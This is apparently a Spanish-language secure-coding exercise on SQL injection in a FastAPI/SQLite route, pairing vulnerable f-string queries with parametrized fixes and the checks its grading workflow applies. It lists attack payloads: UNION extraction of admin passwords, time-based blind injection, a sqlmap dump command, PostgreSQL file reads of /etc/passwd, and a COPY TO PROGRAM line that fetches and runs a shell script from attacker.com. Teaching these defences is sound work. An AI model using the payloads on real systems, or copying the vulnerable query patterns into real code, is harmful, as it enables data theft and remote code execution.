# Paso 21 — SQL Injection
**Tecnologia:** Python / FastAPI + SQLite | **OWASP:** A03:2021 - Injection | **CWE-89**

---

## Que es esta vulnerabilidad?

SQL Injection es posiblemente la vulnerabilidad mas conocida y mas explotada de la historia de la seguridad web. Ocurre cuando input del usuario se concatena directamente en una consulta SQL, permitiendo al atacante modificar la estructura de la query.

Bases de datos relacionales como SQLite, PostgreSQL, MySQL, Microsoft SQL Server y Oracle usan SQL como lenguaje de consulta. Todas son vulnerables a SQL Injection cuando las consultas se construyen con concatenacion de strings en lugar de parametros preparados.

El impacto va desde lectura de datos confidenciales (dump completo de la base de datos) hasta modificacion y borrado de datos, bypass de autenticacion, y en algunas configuraciones de MSSQL y PostgreSQL, ejecucion de comandos del sistema operativo via `xp_cmdshell` o `COPY TO/FROM PROGRAM`.

---

## Donde ocurre en este codigo?

**Archivo:** `src/python/routes/users.py`

```python
# CODIGO VULNERABLE — estado actual del ejercicio
@router.get("/users")
async def get_user(username: str):
    conn = sqlite3.connect(":memory:")
    cursor = conn.execute(
        f"SELECT id, username, email FROM users WHERE username = '{username}'"
    )
    rows = cursor.fetchall()
    conn.close()
    return {"users": rows}
```

Con `username = "alice"`, la query es:
```sql
SELECT id, username, email FROM users WHERE username = 'alice'
```

Con `username = "' OR '1'='1"`, la query se convierte en:
```sql
SELECT id, username, email FROM users WHERE username = '' OR '1'='1'
```
La condicion `'1'='1'` siempre es verdadera, devolviendo todos los registros.

---

## Como lo explotaria un atacante

**Dump de tabla completa (bypass de filtro WHERE):**
```
GET /users?username=' OR '1'='1
```

**UNION-based: extraer datos de otra tabla:**
```
GET /users?username=' UNION SELECT null, username, password FROM admin_users--
```
Extrae usuarios y contrasenas de la tabla `admin_users`.

**Blind SQL Injection (inferencia por tiempo):**
```
GET /users?username=' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 FROM (SELECT SLEEP(5))x) END)='1
```
Si la condicion es verdadera, el servidor responde inmediatamente. Si es falsa, tarda 5 segundos. Permite extraer datos bit a bit sin ver la respuesta directa.

**Herramientas automatizadas:**
```bash
sqlmap -u "http://target/users?username=alice" --dbs --dump
# sqlmap detecta la inyeccion y extrae el esquema y datos completos automaticamente
```

**En PostgreSQL: RCE via COPY:**
```sql
'; COPY (SELECT '') TO PROGRAM 'curl https://attacker.com/shell.sh | bash' --
```

---

## Tu tarea: aplicar la mitigacion

Modifica `src/python/routes/users.py` para usar consultas parametrizadas:

```python
# CODIGO SEGURO
import sqlite3
from fastapi import APIRouter

router = APIRouter()

@router.get("/users")
async def get_user(username: str):
    conn = sqlite3.connect(":memory:")
    # El ? es un placeholder: sqlite3 serializa el valor de forma segura
    # El input del usuario NUNCA toca el texto de la query SQL
    cursor = conn.execute(
        "SELECT id, username, email FROM users WHERE username = ?",
        (username,)
    )
    rows = cursor.fetchall()
    conn.close()
    return {"users": rows}
```

### Por que funciona esta mitigacion?

- **Consultas parametrizadas:** el driver de base de datos recibe la query y los parametros por separado. La query `SELECT ... WHERE username = ?` es compilada primero por el motor SQL. El valor `(username,)` se envia como dato opaco, nunca como parte del texto SQL.
- **Sin interpretacion posible:** incluso si `username = "' OR '1'='1"`, el motor SQL busca literalmente un usuario llamado `' OR '1'='1` en la columna `username`. El apostrofo no tiene significado especial porque no forma parte del texto SQL.
- **Aplica a todos los RDBs:** `?` en SQLite/MySQL, `$1` en PostgreSQL, `:param` en Oracle. La tecnica es la misma en todos.

---

## Variantes de la misma categoria (SQL Injection — distintas bases de datos)

### Variante A: Second-Order SQL Injection (datos seguros al guardar, inseguros al usar)

```python
# VULNERABLE — registro seguro, pero uso posterior inseguro
@router.post("/register")
async def register(username: str, password: str):
    # Primer insert parametrizado — parece seguro
    conn.execute("INSERT INTO users (username) VALUES (?)", (username,))

@router.get("/profile")
async def profile(username: str):
    # Recupera el username de la DB (parece "seguro" porque vino de la DB)
    user = conn.execute("SELECT username FROM users WHERE username = ?", (username,)).fetchone()
    # Construye nueva query concatenando el valor de la DB — INSEGURO
    logs = conn.execute(
        f"SELECT * FROM audit_logs WHERE user = '{user[0]}'"  # Second-order injection
    ).fetchall()
```

El atacante registra el username `admin'--`. Este se almacena en la DB. Cuando la segunda query lo usa sin parametrizar, inyecta SQL aunque el dato "vino de la base de datos".

```python
# SEGURO — parametrizar TODAS las queries, incluyendo con datos de la propia DB
logs = conn.execute(
    "SELECT * FROM audit_logs WHERE user = ?", (user[0],)
).fetchall()
```

---

### Variante B: ORM con raw queries — SQLAlchemy

```python
# VULNERABLE — SQLAlchemy raw query con f-string
from sqlalchemy import text

@router.get("/orders")
async def get_orders(status: str, db: Session = Depends(get_db)):
    result = db.execute(text(f"SELECT * FROM orders WHERE status = '{status}'"))
    return result.fetchall()
```

```python
# SEGURO — SQLAlchemy parametrizado con :param
@router.get("/orders")
async def get_orders(status: str, db: Session = Depends(get_db)):
    result = db.execute(
        text("SELECT * FROM orders WHERE status = :status"),
        {"status": status}
    )
    return result.fetchall()

# AUN MEJOR — usar el ORM de SQLAlchemy que parametriza automaticamente
@router.get("/orders/v2")
async def get_orders_v2(status: str, db: Session = Depends(get_db)):
    return db.query(Order).filter(Order.status == status).all()
```

---

### Variante C: SQL Injection en PostgreSQL via COPY y pg_read_file

```sql
-- En PostgreSQL con privilegios de superuser, SQLi puede derivar en RCE
'; SELECT pg_read_file('/etc/passwd', 0, 1000000) --
-- Lee el archivo /etc/passwd del servidor

'; COPY users TO '/tmp/dump.csv' --
-- Exporta la tabla users a un archivo accesible

'; CREATE TABLE cmd_exec(cmd_output TEXT);
COPY cmd_exec FROM PROGRAM 'id' --
-- Ejecuta comandos del sistema operativo
```

La mitigacion es la misma: consultas parametrizadas + principio de minimo privilegio (el usuario de la DB no debe ser superuser).

---

## Referencias

- [OWASP A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CVE-2023-20887 - SQLi en VMware Aria Operations](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-20887)

---

## Lo que valida el workflow automaticamente

El workflow **Validate Step 21** exige que `src/python/routes/users.py` contenga:
- `"SELECT id, username, email FROM users WHERE username = ?"`
- `(username,)`
- La ausencia de `f"SELECT`
